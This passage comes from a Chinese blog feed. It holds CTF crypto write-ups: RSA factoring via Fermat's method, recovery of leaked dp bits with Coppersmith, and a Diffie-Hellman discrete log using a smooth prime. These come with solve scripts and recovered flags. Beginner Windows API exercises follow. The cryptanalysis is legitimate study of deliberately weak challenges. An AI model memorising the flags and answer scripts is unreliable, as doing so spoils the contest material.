class="number">137709853388874260067664060306224801065880567280896538344708662296491187670268243771581008615887329285442080267493172576517227603581814922784005894668293664250883858847270414696279127204843462302026428548409668060539273696154323753582118715764251826181439387752900169898505518594134423187783089073450520527969</span></span><br><span class="line">    <span class="comment"># the public exponent</span></span><br><span class="line">    e = <span class="number">85605944479801539190292577400294315989703364683792339737453887619652946907819548388390076584246192710348319524405250340541547224543819349494488596679810310694697763188201375896240755682682520811114377302206659716598003967368992125832908158096663258971132148617761060030524535044970322206572134828548118438019</span></span><br><span class="line">    example(N,e)</span><br></pre></td></tr></table></figure>
<p>得到 <code>d = 106354342195162244579308763693125372187924746644745144997173096990722844612139</code><br>即可 <code>ISITDTU&#123;Thank5_f0r_4tt3nd1ng_0ur_C0nt3st&#125;</code></p>
<h2 id="Easy-RSA-2"><a href="#Easy-RSA-2" class="headerlink" title="Easy_RSA_2"></a>Easy_RSA_2</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;##################################&#x27;</span></span><br><span class="line">p1 = getPrime(<span class="number">512</span>)</span><br><span class="line">p2 = gmpy2.next_prime(p1)</span><br><span class="line">q1 = getPrime(<span class="number">512</span>)</span><br><span class="line">q2 = gmpy2.next_prime(q1)</span><br><span class="line">n = p1*p2*q1*q2</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = (p1-<span class="number">1</span>)*(p2-<span class="number">1</span>)*(q1-<span class="number">1</span>)*(q2-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(flag),e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">pow</span>(p1+q2,<span class="number">65537</span>,n)</span><br><span class="line"><span class="comment">#5043622010330564722783560796388733110223192234657313797979729183216316602247790170027393145104828283812158304519218370476380897023249898720267053051908498011845198383126598688185743313040451851234309071530873683667360872515868401870834371902623509762498919172464493397284930232415029297203698778851121422456149280629701148108649396642433199634388011535777204188207597427548981195309015900421249473588077922607729093939587454170211363784480831197764238579460361668878037335596700513382133341370374840639374005225742007557272153800433699784092511039693877686425832957477808359462507401596842526527374816943302475357302</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">pow</span>(p2+q1,<span class="number">65537</span>,n)</span><br><span class="line"><span class="comment">#7919283184559406259028604751155413696993375814336862337694645459367829841130544291770103966362177145582007048754925168845793555136985754996486596987205043932984314934297789456823769422776642272151478021108135062833657996366160688598742804847633068533451034898357435150319123770512604358033881809960916484049603490477616900480883862825416570459592254659007024761917196293369565486538943942938968226701375668351560376904094935919442322484791587819687743780031411339960372463937311578960714219580981945254129150844798674023932645363519148439092971133029751088847668041720574694350298717079140377388740434213791727288722</span></span><br><span class="line"><span class="built_in">print</span> n </span><br><span class="line"><span class="comment">#8573641536164485111081609341110540574423426701587222458588002464807917555910942077276167528046769327390058096169685188870928286845342631974847171845103806710768418462668311621275704636581042137915505959767806384415314024549489538717607173007829067492516776714817262226691787436227002924225311861164296655909746846329870548266285498682510415418053656271623482202491805513797215793596385014264449282551352796096361524482384994633912515104414237252657058698433260597636367614328512751722615849959987780969423318207123668118325176544879335267439096589035064596631756303300860315257404427016819145298919974287174103934503</span></span><br><span class="line"><span class="built_in">print</span> c </span><br><span class="line"><span class="comment">#8436043641135865531308468859210199431445831063674810351906331674115825605849862045115409554309732867926457428348729196827592921108183774070414343257409618631078896543782150761081732376735501920417229787663210936174854000594130785353102718054331606096192133481536724402629697019651921188121029927710787682993814748802295545306899075962041017278877203965796981792702098381465051289581518257202127401748725944229037078896857591660248467597356051123218945757343652461844056927461929195427880969904210166880623689090977714615839624798930450630919330253477634839161931755642681718034910946900928731231093352169252474939674</span></span><br></pre></td></tr></table></figure>
<p>貌似可以费马分解？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p1和p2 q1和q2 都相差很小</span><br><span class="line">p1*q1 p2*q2    p1*q2 p2*q1    都很接近</span><br><span class="line">费马分解!</span><br><span class="line">将 p1*q1,p2*q2    p1,q2,p2*q1  分别作为两组因子</span><br><span class="line">分解n能得到这4个的值 再求gcd就可以得到p1,p2,q1,q2了!</span><br></pre></td></tr></table></figure>

<p>实际跑了跑 发现好慢啊…<br>先贴着吧 以后想想怎么用上给的另外两个条件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># from Crypto.Util.number import *</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd,iroot,is_square,sqrt</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">n = <span class="number">8573641536164485111081609341110540574423426701587222458588002464807917555910942077276167528046769327390058096169685188870928286845342631974847171845103806710768418462668311621275704636581042137915505959767806384415314024549489538717607173007829067492516776714817262226691787436227002924225311861164296655909746846329870548266285498682510415418053656271623482202491805513797215793596385014264449282551352796096361524482384994633912515104414237252657058698433260597636367614328512751722615849959987780969423318207123668118325176544879335267439096589035064596631756303300860315257404427016819145298919974287174103934503</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Fermat_Factorize</span>(<span class="params">n</span>):</span><br><span class="line">    factor_list = []</span><br><span class="line">    a = <span class="built_in">int</span>(sqrt(n))+<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        b2 = a*a-n</span><br><span class="line">        <span class="keyword">if</span>(is_square(b2)):</span><br><span class="line">            b = <span class="built_in">int</span>(iroot(b2,<span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line">            factor_list.append([a-b,a+b])</span><br><span class="line">            <span class="built_in">print</span>(factor_list)</span><br><span class="line">        a = a+<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(factor_list)==<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> factor_list</span><br><span class="line"></span><br><span class="line">t0 = time()</span><br><span class="line">factort_list = Fermat_Factorize(n)</span><br><span class="line"><span class="built_in">print</span>(factort_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;=========================================\n&#x27;</span>,time()-t0)</span><br></pre></td></tr></table></figure>

<h2 id="Old-Story"><a href="#Old-Story" class="headerlink" title="Old_Story"></a>Old_Story</h2><p>题目描述:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">This is an old story about wheat and chessboard, and it&#x27;s easy, right?</span><br></pre></td></tr></table></figure>
<p>cipher.txt:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[524288, 4194304, 16384, 1024, 4194304, 32, 262144, 2097152, 4194304, 16777216, 70368744177664, 2251799813685248, 8192, 8388608, 8192, 4503599627370496, 16777216, 36028797018963968, 16384, 2199023255552, 67108864, 1048576, 2097152, 18014398509481984, 33554432, 68719476736, 4, 17179869184, 536870912, 549755813888, 262144, 4294967296, 16384, 128, 288230376151711744, 137438953472, 16777216, 36028797018963968, 1024, 4503599627370496, 16384, 68719476736, 262144, 4611686018427387904]</span><br></pre></td></tr></table></figure>
<p>这  属于脑洞题了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> ct</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line">b64table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line">h = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> ct:</span><br><span class="line">    h += b64table[c.bit_length() - <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">flag = b64decode(h)</span><br><span class="line"><span class="keyword">assert</span> flag == <span class="string">&quot;ISITDTU&#123;r1c3_che55b0ard_4nd_bs64&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>


<h1 id="KAPO2019"><a href="#KAPO2019" class="headerlink" title="KAPO2019"></a>KAPO2019</h1><h2 id="Lenstra-Lenstra-Lovasz"><a href="#Lenstra-Lenstra-Lovasz" class="headerlink" title="Lenstra-Lenstra-Lovász"></a>Lenstra-Lenstra-Lovász</h2><p>task.sage</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long <span class="keyword">as</span> b2l</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate</span>():</span><br><span class="line">    p = random_prime(<span class="number">2</span> ** <span class="number">1024</span>)</span><br><span class="line">    q = random_prime(<span class="number">2</span> ** <span class="number">1024</span>)</span><br><span class="line">    e = random_prime(<span class="number">200</span>, <span class="literal">False</span>, <span class="number">150</span>)</span><br><span class="line">    d = inverse_mod(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">    n = p * q</span><br><span class="line">    <span class="keyword">return</span> [n, e, p, q, d]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    n, e, p, q, d = generate()</span><br><span class="line">    key = [n, e, p, q, d]</span><br><span class="line"></span><br><span class="line">    flag = b2l(<span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>).read())</span><br><span class="line">    ct = <span class="built_in">pow</span>(flag, e, n)</span><br><span class="line"></span><br><span class="line">    secret = d % (p-<span class="number">1</span>)</span><br><span class="line">    bits = secret.nbits()</span><br><span class="line">    bias = bits // <span class="number">10</span></span><br><span class="line"></span><br><span class="line">    secret = secret &gt;&gt; (bits//<span class="number">2</span> - bias)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (n, e, secret)</span><br><span class="line">    <span class="built_in">print</span> (ct)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>enc.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(6455822262099728871488017333002213763928974244728225916053004114762757288446279146632134559883137763509202760259665317867526185880602417384903035043373123172755205541848380033846647830559956562300790213183285570408285813940654388322823643901338114411098146713766948059574036750169834145669828812062836846441826158939413816441792342997972511615875337134161543579227974534136317577528234543157933263750295100350176275449872173516777290564027194224977405688960141636944708509979113636374750606901261856017099651198201404715950047463077544354559113250673461981023710617386807665904679700243253715051955720384474605996461, 42209220078437574866361422834065152842384701674177020659394975551630638228773791512185847142423481006715264054186715352545791966183624550240806137742117804368809490341638374030752315967)</span><br><span class="line">5283729370502224111594887226837880395316054773227004499787302073503878519636633822827217253857874355522588395812835740811362707153363560194601186826283559964747701769601487977762111123819420098096415036853595000842267748990264765099199777366178415275775930611456486254983609977806288992648707705283164998069127159450643405479857352132413567941113596062821699046442601516070886895831454313645493977658887986960438243972899363731335524071661232212596476620001731293273701784412244890405468701582192239044191141716454262551899911176914268204608240121498434944371667705131307108367792229003968794133948069333063516311066</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>emmm e&#x3D;151<br>dp高位泄露 搜了一圈发现都是从这位<a href="https://github.com/pcw109550/write-up/tree/master/2019/KAPO/Lenstra-Lenstra-Lovasz" target="_blank">佬</a>这里开始的 orz 直接跟着source学习吧<br>记录一下推导过程:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dp === d % p-1</span><br><span class="line">d == dp+k1*(p-1)</span><br><span class="line">e*d == k2*(p-1)*(q-1)+1</span><br><span class="line">=&gt; e*(dp+k1*(p-1)) == k2*(p-1)*(q-1)+1</span><br><span class="line">mod p-1</span><br><span class="line">=&gt; e*dp === 1 mod p-1</span><br><span class="line">=&gt; e*dp == _k*(p-1)+1</span><br><span class="line">mod p (※)</span><br><span class="line">=&gt; e*dp+k_-1 === 0 mod p</span><br><span class="line">notice that e*dp == _k*(p-1)+1 and dp&lt;p-1</span><br><span class="line">=&gt; _k&lt;e (和dp泄露原理一样!)</span><br><span class="line">so we can enumerate _k from 1 to e</span><br><span class="line">to use coppersmith (for the reason that unknown bits&lt;=410 and beta=1/2, so we can find small roots &lt; N**1/4(512bits))</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">(n, secret) = (<span class="number">6455822262099728871488017333002213763928974244728225916053004114762757288446279146632134559883137763509202760259665317867526185880602417384903035043373123172755205541848380033846647830559956562300790213183285570408285813940654388322823643901338114411098146713766948059574036750169834145669828812062836846441826158939413816441792342997972511615875337134161543579227974534136317577528234543157933263750295100350176275449872173516777290564027194224977405688960141636944708509979113636374750606901261856017099651198201404715950047463077544354559113250673461981023710617386807665904679700243253715051955720384474605996461</span>, <span class="number">42209220078437574866361422834065152842384701674177020659394975551630638228773791512185847142423481006715264054186715352545791966183624550240806137742117804368809490341638374030752315967</span>)</span><br><span class="line">ct = <span class="number">5283729370502224111594887226837880395316054773227004499787302073503878519636633822827217253857874355522588395812835740811362707153363560194601186826283559964747701769601487977762111123819420098096415036853595000842267748990264765099199777366178415275775930611456486254983609977806288992648707705283164998069127159450643405479857352132413567941113596062821699046442601516070886895831454313645493977658887986960438243972899363731335524071661232212596476620001731293273701784412244890405468701582192239044191141716454262551899911176914268204608240121498434944371667705131307108367792229003968794133948069333063516311066</span></span><br><span class="line">e = <span class="number">151</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">k</span>):</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    f = e*((secret*<span class="number">2</span>**<span class="number">410</span>)+x)+k-<span class="number">1</span></span><br><span class="line">    f = f.monic()</span><br><span class="line">    roots = f.small_roots(X=<span class="number">2</span>^<span class="number">409</span>,beta=<span class="number">0.4</span>)</span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;dp= <span class="subst">&#123;secret*<span class="number">2</span>**<span class="number">409</span>+roots[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;=================================&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,e):</span><br><span class="line">    attack(k)</span><br><span class="line"><span class="comment"># dp= 111610627483329456042773469243525292052790452506522007088578106283136307535942428003600535113613729808907790947325623821175745420979563394756953617513882387710361103999394612618576932519125987576858649069903834459634170735915011161895680193594023143108156113045675433885394403477072411701711342985242940069663</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>然后就是简单的dp泄露题目了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,e+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span>((dp*e-<span class="number">1</span>+k)%k==<span class="number">0</span>):</span><br><span class="line">        p = (dp*e-<span class="number">1</span>+k)//k</span><br><span class="line">        q = n//p</span><br><span class="line">        <span class="keyword">if</span>(p*q==n):</span><br><span class="line">            <span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">            <span class="keyword">from</span> primefac <span class="keyword">import</span> *</span><br><span class="line">            d = modinv(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">            <span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(ct,d,n)))</span><br></pre></td></tr></table></figure>

<p>flag: POKA{You_4r3_Crypt0_N00000B_XDD}</p>
<p>这位佬真的tql orz</p>
<h1 id="moeCTF2023"><a href="#moeCTF2023" class="headerlink" title="moeCTF2023"></a>moeCTF2023</h1><h2 id="flag-exchange"><a href="#flag-exchange" class="headerlink" title="flag_exchange"></a>flag_exchange</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fs:</span><br><span class="line">    flag = fs.read().strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">diffie_hellman</span>(<span class="params">p, flag</span>):</span><br><span class="line">    alice_privKey = getrandbits(<span class="number">1024</span>)</span><br><span class="line">    alice_pubKey = <span class="built_in">pow</span>(<span class="number">7</span>, alice_privKey, p)</span><br><span class="line">    bob_privKey = getrandbits(<span class="number">1024</span>)</span><br><span class="line">    bob_pubKey = <span class="built_in">pow</span>(<span class="number">7</span>, bob_privKey, p)</span><br><span class="line"></span><br><span class="line">    superkey = <span class="built_in">pow</span>(bob_pubKey, alice_privKey, p)</span><br><span class="line">    m = <span class="built_in">int</span>.from_bytes(flag, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> (m * superkey) % p, alice_pubKey, bob_pubKey</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Callable</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chall</span>(<span class="params"><span class="built_in">input</span>:<span class="type">Callable</span>[[<span class="built_in">str</span>],<span class="literal">None</span>], <span class="built_in">print</span>:<span class="type">Callable</span>[[<span class="built_in">str</span>],<span class="literal">None</span>]</span>):</span><br><span class="line">    p = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;P = &quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> isPrime(p) <span class="keyword">and</span> p.bit_length() &gt;= <span class="number">1024</span>:</span><br><span class="line">        c, alice_pubKey, bob_pubKey = diffie_hellman(p, flag)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Alice&#x27;s public key: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(alice_pubKey))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Bob&#x27;s public key: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(bob_pubKey))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Ciphertext: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(c))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Invalid P&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>给一个P保证P-1光滑 这样离散对数直接求就行了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> modinv</span><br><span class="line">p = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sieve_base)):</span><br><span class="line">    p*=sieve_base[i]</span><br><span class="line">    <span class="keyword">if</span>(p.bit_length()&gt;=<span class="number">1024</span> <span class="keyword">and</span> isPrime(p+<span class="number">1</span>)):</span><br><span class="line">        <span class="built_in">print</span>(p+<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">20404068993016374194542464172774607695659797117423121913227131032339026169175929902244453757410468728842929862271605567818821685490676661985389839958622802465986881376139404138376153096103140834665563646740160279755212317501356863003638612390661668406235422311783742390510526587257026500302696834793248526734305801634165948702506367176701233298064616663553716975429048751575597150417381063934255689124486029492908966644747931</span></span><br><span class="line">A = <span class="number">10535907278790700538391290444921305217259385431263711692801040936511190666531116700305186920599844299554256714210210829717476920248418057857281038962186002736577757264399457937073280966879708966646259512918943865328709139377854814605040022146158670388299143718823490062168338902733222126015956430817934114854967961103604652093740121364332358685392900872098860796503201407589428414466539049626631184008892730055415169100769732</span></span><br><span class="line">B = <span class="number">16348489331356867301630771825154767170233294861057688783357728790213156540287376598857687580984409669161724312800129242584879634810196465793194307910350584763235456209835940884693137265638231235038196296978539087935504760585844080798763164306369527171514584826163061235753126778212519635905807390933273873667058848266096108542464516152013945119362646618506147214283108243842818817447082449655146411335921417161043077611902804</span></span><br><span class="line">c = <span class="number">7632994523412492260557179922189823901916021592995792231423394289817118356542879338257864183368725535825022550174733859623962587355640726058879305520054662785703521463831735133391030853928379496146944314205140328897640874120866187629354584127754485292965951151063241820133235042448633627434068969391854258102614435821987664948230501326316243932358798360818637206571054067460923260493428092446138441830565932807827179355927283</span></span><br><span class="line"><span class="comment"># _A = discrete_log(mod(A,p),mod(7,p))</span></span><br><span class="line"><span class="comment"># _super = pow(B,_A,p)</span></span><br><span class="line"></span><br><span class="line">_<span class="built_in">super</span> = <span class="number">5598697508050553831301016186451810766892175075227457781663609137315994994339946099771767989549360029474161927222425134451542335224836812568338804744981790630968653314082988409623033093913313149007040705162350558420312224001860502897319860524983780294087905883722904658909173858938483002561143035786870483434405455082101246235125472463011482817487767144926351669559368591298053399981071648084262851031724505873554319182541246</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(modinv(_<span class="built_in">super</span>,p)*c%p))</span><br><span class="line"><span class="comment"># moectf&#123;diffie_he11man_key_exChange_is_not_so_hard_2WPIBung92WPIBung9?WP&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF-Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>Windows-Programming-Exercise</title>
    <url>/2023/12/10/Windows-Programming-Exercise/</url>
    <content><![CDATA[<p>记录学习Windows编程的一些知识点和练习代码</p>
<span id="more"></span>

<h1 id="2023"><a href="#2023" class="headerlink" title="2023"></a>2023</h1><h2 id="12-10"><a href="#12-10" class="headerlink" title="12.10"></a>12.10</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><p>最简单的一个API MessageBox</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span> </span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (lib,<span class="string">&quot;User32.lib&quot;</span>) <span class="comment">// 指明将源文件编译成.obj后 将目标文件链接成可执行文件的过程中需要使用User32.lib</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">WinMain</span><span class="params">(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,<span class="type">int</span> nCmdShow)</span>&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;hInstance&lt;&lt;<span class="string">&quot;\n&quot;</span>&lt;&lt;hPrevInstance&lt;&lt;<span class="string">&quot;\n&quot;</span>&lt;&lt;lpCmdLine&lt;&lt;<span class="string">&quot;\n&quot;</span>&lt;&lt;nCmdShow&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    MessageBoxW(<span class="literal">NULL</span>,<span class="string">L&quot;Start to Learn Windows Programming!&quot;</span>,<span class="string">L&quot;Message Box&quot;</span>,MB_OKCANCEL);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>还是混合起来编吧 C++用惯了…</p>
<p>关于WinMain：<br>WinMain函数是程序入口点 相当于C中的main<br>四个参数:</p>
<ul>
<li>hInstance: 应用程序本次运行实例的句柄 这里打印出来是 0x400000</li>
<li>hPrevInstance: 应用程序之前运行实例的句柄 这里打印出来是 0</li>
<li>lpCmdLine: 运行时参数 比如 cmd运行 start.exe AAA  那么lpCmdLine就指向”AAA” LPSTR是常用的字符串类型 这里为空</li>
<li>nCmdShow: 表示应用程序窗口(如果有)的显示状态 这里打印10</li>
</ul>
<h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><p>常用Windows数据类型</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,<span class="type">int</span> nCmdShow)</span></span>&#123;</span><br><span class="line">    LPWSTR szString = <span class="string">L&quot;Type: string&quot;</span>;</span><br><span class="line">    WCHAR lpString[<span class="number">120</span>];</span><br><span class="line">    DWORD dwMax = <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">    DWORD dwOne = <span class="number">0x1</span>;</span><br><span class="line">    INT iMax = <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">    INT iOne = <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">MessageBoxW</span>(<span class="literal">NULL</span>,szString,<span class="string">L&quot;LPSTR&quot;</span>,MB_OK);</span><br><span class="line">    INT len = <span class="built_in">min</span>(<span class="built_in">wcslen</span>(szString)+<span class="number">20</span>,(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="number">119</span>); <span class="comment">// ! wcslen!!!</span></span><br><span class="line">    cout&lt;&lt;len&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="built_in">CopyMemory</span>(lpString,szString,len);</span><br><span class="line">    <span class="built_in">MessageBoxW</span>(<span class="literal">NULL</span>,lpString,<span class="string">L&quot;CHAR[]&quot;</span>,MB_OK);</span><br><span class="line">    <span class="keyword">if</span>(dwMax&gt;dwOne)&#123;</span><br><span class="line">        <span class="built_in">MessageBoxW</span>(<span class="literal">NULL</span>,<span class="string">L&quot;DWORD: 0xFFFFFFFF&gt;0x1&quot;</span>,<span class="string">L&quot;DWORD&quot;</span>,MB_OK);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">MessageBoxW</span>(<span class="literal">NULL</span>,<span class="string">L&quot;DWORD: 0xFFFFFFFF&gt;&lt;&quot;</span>,<span class="string">L&quot;DWORD&quot;</span>,MB_OK);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>^<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>书上好多都跑不通  比如LPWSTR类型的获取长度要用wcslen 直接取len+1复制过来不大对劲…<br>都有unicode的MessageBoxW 后面字符串加L</p>
<h2 id="12-11"><a href="#12-11" class="headerlink" title="12.11"></a>12.11</h2><h3 id="1-1"><a href="#1-1" class="headerlink" title="1."></a>1.</h3><p>将系统目录信息写入txt</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">// 将系统目录信息写入root.txt</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, TCHAR argv[])</span></span>&#123;</span><br><span class="line">    HANDLE hFile;</span><br><span class="line">    DWORD dwWritten;</span><br><span class="line">    TCHAR szSystemDirectory[MAX_PATH];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">GetSystemDirectory</span>(szSystemDirectory,MAX_PATH);</span><br><span class="line">    <span class="built_in">strcat</span>((<span class="type">char</span>*)szSystemDirectory,<span class="string">&quot;\\WOW\\ULGANOY_desu&quot;</span>);</span><br><span class="line">    hFile = <span class="built_in">CreateFileW</span>(<span class="string">L&quot;root.txt&quot;</span>,GENERIC_WRITE,<span class="number">0</span>,<span class="literal">NULL</span>,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(hFile!=INVALID_HANDLE_VALUE)&#123;</span><br><span class="line">        <span class="type">int</span> len = <span class="built_in">lstrlen</span>(szSystemDirectory);</span><br><span class="line">        cout&lt;&lt;len&lt;&lt;<span class="string">&quot;\n\n\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">WriteFile</span>(hFile,szSystemDirectory,len,&amp;dwWritten,<span class="literal">NULL</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">GetLastError</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里要用CreateFileW!!!</p>
<h3 id="2-1"><a href="#2-1" class="headerlink" title="2."></a>2.</h3><p>窗口创建以及消息处理</p>
